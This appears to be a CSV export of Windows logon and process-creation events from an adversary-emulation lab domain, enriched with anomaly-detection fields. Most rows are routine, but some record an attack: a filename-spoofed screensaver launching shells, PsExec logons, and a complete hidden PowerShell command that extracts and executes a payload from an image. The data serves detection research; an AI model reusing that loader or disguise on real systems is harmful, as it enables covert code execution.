ProcessName,SubjectUserName,@timestamp,host,Hostname,EventID,SubjectLogonId,ProcessId,LogonType,TargetLogonId,WorkstationName,IpAddress,TargetUserName,PrivilegeList,CommandLine,ParentProcessName,NewProcessId,is_remote_logon,was_elevated,anomaly_score,detection_source,NewProcessPath,NewProcessName,ParentProcessNameOnly,suspicious_office_spawn,suspicious_svchost,exit_time,duration_seconds,pair_key,pair_frequency
,-,2020-05-02 03:19:27.116000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x0,0x4,0.0,0x3e7,-,-,SYSTEM,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\wininit.exe,SCRANTON$,2020-05-02 03:19:27.219000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x25c,2.0,0x828e,-,-,UMFD-0,,,,,False,False,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\winlogon.exe,SCRANTON$,2020-05-02 03:19:27.221000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x2b0,2.0,0x834a,-,-,UMFD-1,,,,,False,False,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\winlogon.exe,SCRANTON$,2020-05-02 03:19:28.255000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x2b0,2.0,0xdd9b,-,-,DWM-1,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\winlogon.exe,SCRANTON$,2020-05-02 03:19:28.256000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x2b0,2.0,0xddb8,-,-,DWM-1,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\winlogon.exe,SCRANTON$,2020-05-02 03:20:47.620000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x14dc,2.0,0x12106a,-,-,UMFD-2,,,,,False,False,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\winlogon.exe,SCRANTON$,2020-05-02 03:20:47.894000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x14dc,2.0,0x121a19,-,-,DWM-2,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\winlogon.exe,SCRANTON$,2020-05-02 03:20:47.895000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x14dc,2.0,0x121a62,-,-,DWM-2,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\svchost.exe,SCRANTON$,2020-05-02 03:20:49.428000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x594,10.0,0x1305dc,SCRANTON,172.18.39.2,pbeesly,,,,,True,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\System32\svchost.exe,SCRANTON$,2020-05-02 03:20:49.429000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4624,0x3e7,0x594,10.0,0x13069a,SCRANTON,172.18.39.2,pbeesly,,,,,True,False,-1,logon_anomaly,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:11:41.263000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x23f4,2.0,0x867797,NASHUA,-,pbeesly,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:11:41.264000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x23f4,2.0,0x867825,NASHUA,-,pbeesly,,,,,False,False,-1,logon_anomaly,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:12:47.928000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x1720,2.0,0x86b56b,NASHUA,-,pbeesly,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:12:47.930000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x1720,2.0,0x86b59a,NASHUA,-,pbeesly,,,,,False,False,-1,logon_anomaly,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:13:51.455000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x2074,2.0,0x86e324,NASHUA,-,pbeesly,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:13:51.457000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x2074,2.0,0x86e353,NASHUA,-,pbeesly,,,,,False,False,-1,logon_anomaly,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:15:05.608000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x658,2.0,0x89174e,NASHUA,-,pbeesly,,,,,False,True,-1,logon_anomaly,,,,,,,,,
C:\Windows\PSEXESVC.exe,NASHUA$,2020-05-02 03:15:05.610000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4624,0x3e7,0x658,2.0,0x89177d,NASHUA,-,pbeesly,,,,,False,False,-1,logon_anomaly,,,,,,,,,
,SCRANTON$,2020-05-02 03:20:01.053000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s fhsvc,C:\Windows\System32\services.exe,0x1134,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:20:15.314000+00:00,14.261,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:20:01.053000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x3e4,,,SCRANTON$,,C:\windows\System32\svchost.exe -k NetworkService -p -s DoSvc,C:\Windows\System32\services.exe,0x113c,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:24:23.396000+00:00,262.343,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:20:01.054000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\System32\svchost.exe -k NetSvcs -p -s NcaSvc,C:\Windows\System32\services.exe,0x1158,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:20:01.438000+00:00,0.384,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:20:02.097000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc,C:\Windows\System32\services.exe,0x1348,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:20:07.532000+00:00,5.4350000000000005,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:20:08.003000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\System32\svchost.exe -k netsvcs -p -s BITS,C:\Windows\System32\services.exe,0x354,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:22:42.870000+00:00,154.86700000000005,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:21:16.344000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x3e4,,,SCRANTON$,,C:\windows\System32\svchost.exe -k NetworkService -p,C:\Windows\System32\services.exe,0x1f94,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:21:25.656000+00:00,9.312,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:21:18.639000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x13069a,,,pbeesly,,C:\Windows\System32\smartscreen.exe -Embedding,C:\Windows\System32\svchost.exe,0x1ec8,,,-1,proc_anomaly,C:\Windows\System32\smartscreen.exe,smartscreen.exe,svchost.exe,False,False,2020-05-02 03:26:20.344000+00:00,301.7050000000001,svchost.exe -> smartscreen.exe,1.0
,SCRANTON$,2020-05-02 03:18:29.127000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k appmodel -p -s camsvc,C:\Windows\System32\services.exe,0xa6c,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:19:26.010000+00:00,56.883,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:18:33.236000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x1058,,0x0,,,-,,"""LogonUI.exe"" /flags:0x4 /state0:0xa3cb8855 /state1:0x41c64e6d",C:\Windows\System32\winlogon.exe,0x1bec,,,-1,proc_anomaly,"""LogonUI.exe""",logonui.exe,winlogon.exe,False,False,2020-05-02 03:19:24.873000+00:00,51.637,winlogon.exe -> logonui.exe,1.0
,SCRANTON$,2020-05-02 03:18:34.330000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k wsappx -p -s AppXSvc,C:\Windows\System32\services.exe,0x14d4,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:19:26.016000+00:00,51.68600000000001,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:18:35.351000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s gpsvc,C:\Windows\System32\services.exe,0x232c,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:19:24.875000+00:00,49.523999999999994,services.exe -> svchost.exe,24.0
,pbeesly,2020-05-02 02:55:57.748000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0x1158,,0x0,,,-,,"""C:\ProgramData\victim\â€®cod.3aka3.scr"" /S",C:\Windows\explorer.exe,0x214c,,,-1,proc_anomaly,"""C:\ProgramData\victim\â€®cod.3aka3.scr""",â€®cod.3aka3.scr,explorer.exe,False,False,2020-05-02 03:01:28.677000+00:00,330.9290000000001,explorer.exe -> â€®cod.3aka3.scr,1.0
,SCRANTON$,2020-05-02 03:20:47.615000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x3b0,,0x3e5,,,LOCAL SERVICE,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x1474,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:22:19.541000+00:00,91.926,svchost.exe -> wmiprvse.exe,14.0
,SCRANTON$,2020-05-02 03:20:47.898000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s DsmSvc,C:\Windows\System32\services.exe,0xa14,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:21:33.258000+00:00,45.36,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:20:51.611000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2e0,,0x0,,,-,,C:\windows\system32\svchost.exe -k wsappx -p -s AppXSvc,C:\Windows\System32\services.exe,0x16a8,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:28:11.110000+00:00,439.499,services.exe -> svchost.exe,24.0
,pbeesly,2020-05-02 03:00:15.426000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xba0,,0x0,,,-,,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0xf24,,,-1,proc_anomaly,powershell.exe,powershell.exe,powershell.exe,False,False,2020-05-02 03:20:07.156000+00:00,1191.73,powershell.exe -> powershell.exe,5.0
,pbeesly,2020-05-02 03:00:15.426000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xf24,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0xed4,,,-1,proc_anomaly,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:05:10.638000+00:00,295.2120000000001,powershell.exe -> conhost.exe,6.0
,NEWYORK$,2020-05-02 03:01:34.553000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x0,,,-,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0x15bc,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:02:49.631000+00:00,75.078,svchost.exe -> wmiprvse.exe,14.0
,NEWYORK$,2020-05-02 03:01:36.990000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x3e4,,,NEWYORK$,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0x15b8,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:02:49.630000+00:00,72.64,svchost.exe -> wmiprvse.exe,14.0
,SCRANTON$,2020-05-02 03:04:31.261000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x134c,,0x0,,,-,,"""C:\windows\system32\SearchProtocolHost.exe"" Global\UsGthrFltPipeMssGthrPipe8_ Global\UsGthrCtrlFltPipeMssGthrPipe8 1 -2147483646 ""Software\Microsoft\Windows Search"" ""Mozilla/4.0 (compatible; MSIE 6.0; Windows NT; MS Search 4.0 Robot)"" ""C:\ProgramData\Microsoft\Search\Data\Temp\usgthrsvc"" ""DownLevelDaemon"" ",C:\Windows\System32\SearchIndexer.exe,0xd38,,,-1,proc_anomaly,"""C:\windows\system32\SearchProtocolHost.exe""",searchprotocolhost.exe,searchindexer.exe,False,False,2020-05-02 03:10:51.862000+00:00,380.601,searchindexer.exe -> searchprotocolhost.exe,4.0
,SCRANTON$,2020-05-02 03:04:31.265000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x134c,,0x0,,,-,,"""C:\windows\system32\SearchFilterHost.exe"" 0 772 776 784 8192 780 ",C:\Windows\System32\SearchIndexer.exe,0x7b8,,,-1,proc_anomaly,"""C:\windows\system32\SearchFilterHost.exe""",searchfilterhost.exe,searchindexer.exe,False,False,2020-05-02 03:08:16.251000+00:00,224.986,searchindexer.exe -> searchfilterhost.exe,5.0
,pbeesly,2020-05-02 03:05:26.907000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xba0,,0x0,,,-,,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0xf0c,,,-1,proc_anomaly,powershell.exe,powershell.exe,powershell.exe,False,False,2020-05-02 03:18:33.253000+00:00,786.346,powershell.exe -> powershell.exe,5.0
,pbeesly,2020-05-02 03:05:26.919000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xf0c,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x1ecc,,,-1,proc_anomaly,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:18:33.257000+00:00,786.3380000000002,powershell.exe -> conhost.exe,6.0
,NASHUA$,2020-05-02 03:05:26.992000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppX4325622ft6437f3xfywcfxgbedfvpn0x.mca",C:\Windows\System32\svchost.exe,0x2108,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:06:27.362000+00:00,60.37000000000001,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:05:27.006000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,C:\Windows\System32\RuntimeBroker.exe -Embedding,C:\Windows\System32\svchost.exe,0x196c,,,-1,proc_anomaly,C:\Windows\System32\RuntimeBroker.exe,runtimebroker.exe,svchost.exe,False,False,2020-05-02 03:06:57.600000+00:00,90.594,svchost.exe -> runtimebroker.exe,8.0
,NASHUA$,2020-05-02 03:05:28.244000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\System32\svchost.exe -k WerSvcGroup,C:\Windows\System32\services.exe,0x1c78,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:07:33.441000+00:00,125.197,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:05:28.351000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppX4325622ft6437f3xfywcfxgbedfvpn0x.mca",C:\Windows\System32\svchost.exe,0x2300,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:06:30.388000+00:00,62.037000000000006,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:05:29.459000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s wlidsvc,C:\Windows\System32\services.exe,0x2220,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:08:38.600000+00:00,189.141,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:05:29.642000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,C:\Windows\System32\RuntimeBroker.exe -Embedding,C:\Windows\System32\svchost.exe,0x528,,,-1,proc_anomaly,C:\Windows\System32\RuntimeBroker.exe,runtimebroker.exe,svchost.exe,False,False,2020-05-02 03:06:59.642000+00:00,90.0,svchost.exe -> runtimebroker.exe,8.0
,NASHUA$,2020-05-02 02:59:35.461000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1338,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:38.945000+00:00,3.4840000000000004,svchost.exe -> backgroundtaskhost.exe,18.0
,SCRANTON$,2020-05-02 03:01:44.374000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s gpsvc,C:\Windows\System32\services.exe,0x204c,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:11:44.304000+00:00,599.9300000000002,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:02:46.350000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x5a8,,0x0,,,-,,C:\windows\system32\ProvTool.exe /turn 5 /source LogonIdleTask,C:\Windows\System32\svchost.exe,0x16b0,,,-1,proc_anomaly,C:\windows\system32\ProvTool.exe,provtool.exe,svchost.exe,False,False,2020-05-02 03:20:37.291000+00:00,1070.941,svchost.exe -> provtool.exe,1.0
,SCRANTON$,2020-05-02 03:02:47.443000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x0,,,-,,C:\windows\system32\svchost.exe -k netsvcs -p -s dmwappushservice,C:\Windows\System32\services.exe,0x1a64,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:06:48.516000+00:00,241.07299999999998,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:02:47.451000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x2d0,,0x3e5,,,LOCAL SERVICE,,C:\windows\system32\svchost.exe -k LocalServiceNetworkRestricted -p -s SmsRouter,C:\Windows\System32\services.exe,0x1bfc,,,-1,proc_anomaly,C:\windows\system32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:08:47.742000+00:00,360.291,services.exe -> svchost.exe,24.0
,NEWYORK$,2020-05-02 03:03:19.186000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x0,,,-,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0x17e4,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:09:20.723000+00:00,361.537,svchost.exe -> wmiprvse.exe,14.0
,NEWYORK$,2020-05-02 03:03:33.333000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x2b8,,0x0,,,-,,C:\windows\System32\svchost.exe -k netsvcs -p -s NetSetupSvc,C:\Windows\System32\services.exe,0xcc0,,,-1,proc_anomaly,C:\windows\System32\svchost.exe,svchost.exe,services.exe,False,False,2020-05-02 03:06:36.411000+00:00,183.078,services.exe -> svchost.exe,24.0
,SCRANTON$,2020-05-02 03:04:05.737000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3e4,,,SCRANTON$,,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,0x2268,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:05:36.251000+00:00,90.514,svchost.exe -> wmiprvse.exe,14.0
,pbeesly,2020-05-02 02:57:13.974000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0x214c,,0x0,,,-,,\\?\C:\windows\system32\conhost.exe --headless --width 80 --height 25 --signal 0x474 --server 0x50c,C:\ProgramData\victim\â€®cod.3aka3.scr,0xc50,,,-1,proc_anomaly,\\?\C:\windows\system32\conhost.exe,conhost.exe,â€®cod.3aka3.scr,False,False,2020-05-02 02:59:22.531000+00:00,128.55700000000002,â€®cod.3aka3.scr -> conhost.exe,2.0
,pbeesly,2020-05-02 02:57:13.974000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0x214c,,0x0,,,-,,"""C:\windows\system32\cmd.exe""",C:\ProgramData\victim\â€®cod.3aka3.scr,0xd98,,,-1,proc_anomaly,"""C:\windows\system32\cmd.exe""",cmd.exe,â€®cod.3aka3.scr,False,False,2020-05-02 02:59:22.531000+00:00,128.55700000000002,â€®cod.3aka3.scr -> cmd.exe,2.0
,pbeesly,2020-05-02 02:57:17.048000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3731f3,0xd98,,0x0,,,-,,powershell,C:\Windows\System32\cmd.exe,0x1ad4,,,-1,proc_anomaly,powershell,powershell,cmd.exe,False,False,2020-05-02 02:58:34.683000+00:00,77.635,cmd.exe -> powershell,3.0
,pbeesly,2020-05-02 02:58:44.904000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0x131c,,0x0,,,-,,"""PowerShell.exe"" -noni -noexit -ep bypass -window hidden -c ""sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\pbeesly\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))""",C:\Windows\System32\control.exe,0xba0,,,-1,proc_anomaly,"""PowerShell.exe""",powershell.exe,control.exe,False,False,2020-05-02 03:18:33.253000+00:00,1188.3490000000004,control.exe -> powershell.exe,1.0
,pbeesly,2020-05-02 02:58:44.912000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x372e81,0xba0,,0x0,,,-,,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,0x1064,,,-1,proc_anomaly,\??\C:\windows\system32\conhost.exe,conhost.exe,powershell.exe,False,False,2020-05-02 03:18:33.257000+00:00,1188.345,powershell.exe -> conhost.exe,6.0
,NASHUA$,2020-05-02 02:59:38.949000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x23e8,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:41.215000+00:00,2.266,svchost.exe -> backgroundtaskhost.exe,18.0
,SCRANTON$,2020-05-02 02:59:16.675000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x884,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:21.315000+00:00,4.6400000000000015,svchost.exe -> backgroundtaskhost.exe,18.0
,SCRANTON$,2020-05-02 02:59:16.684000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,C:\Windows\System32\RuntimeBroker.exe -Embedding,C:\Windows\System32\svchost.exe,0x1a7c,,,-1,proc_anomaly,C:\Windows\System32\RuntimeBroker.exe,runtimebroker.exe,svchost.exe,False,False,2020-05-02 03:00:37.246000+00:00,80.56200000000003,svchost.exe -> runtimebroker.exe,8.0
,SCRANTON$,2020-05-02 02:59:23.719000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0xf10,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:27.305000+00:00,3.5860000000000003,svchost.exe -> backgroundtaskhost.exe,18.0
,SCRANTON$,2020-05-02 02:59:50.621000+00:00,wec.internal.cloudapp.net,SCRANTON.dmevals.local,4688,0x3e7,0x374,,0x3731f3,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1320,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 02:59:51.996000+00:00,1.375,svchost.exe -> backgroundtaskhost.exe,18.0
,NASHUA$,2020-05-02 03:00:10.287000+00:00,wec.internal.cloudapp.net,NASHUA.dmevals.local,4688,0x3e7,0x374,,0x30ba2c,,,pbeesly,,"""C:\windows\system32\backgroundTaskHost.exe"" -ServerName:App.AppXmtcan0h2tfbfy7k9kn8hbxb6dmzz1zh0.mca",C:\Windows\System32\svchost.exe,0x1bdc,,,-1,proc_anomaly,"""C:\windows\system32\backgroundTaskHost.exe""",backgroundtaskhost.exe,svchost.exe,False,False,2020-05-02 03:18:28.084000+00:00,1097.797,svchost.exe -> backgroundtaskhost.exe,18.0
,NEWYORK$,2020-05-02 03:01:29.774000+00:00,wec.internal.cloudapp.net,NEWYORK.dmevals.local,4688,0x3e7,0x3b0,,0x0,,,-,,C:\windows\system32\wbem\wmiprvse.exe -Embedding,C:\Windows\System32\svchost.exe,0x14e0,,,-1,proc_anomaly,C:\windows\system32\wbem\wmiprvse.exe,wmiprvse.exe,svchost.exe,False,False,2020-05-02 03:02:49.631000+00:00,79.857,svchost.exe -> wmiprvse.exe,14.0
